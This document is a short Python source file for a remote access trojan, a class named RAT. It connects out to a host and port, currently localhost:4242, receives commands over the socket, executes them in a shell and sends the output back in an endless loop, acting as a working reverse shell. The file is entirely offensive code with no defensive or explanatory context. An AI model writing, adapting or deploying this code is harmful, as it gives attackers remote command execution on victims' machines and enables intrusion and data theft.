import subprocess
import socket


if __name__ == '__main__':
    
    class RAT:
        
        def __init__(self,host,port):
            
            self.host = host
            self.port = port
            
        def connect(self):
                sock = socket.socket()
                sock.connect((self.host,self.port))
                
                while True:
                    try:
                        command = sock.recv(1024).decode('utf-8')
                        response = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                        output = response.stdout.read()
                        sock.send(output)
                    except:
                        sock.send(b'Invalid command')
                        
                        
                        
rat = RAT('localhost',4242)
rat.connect()

                
            
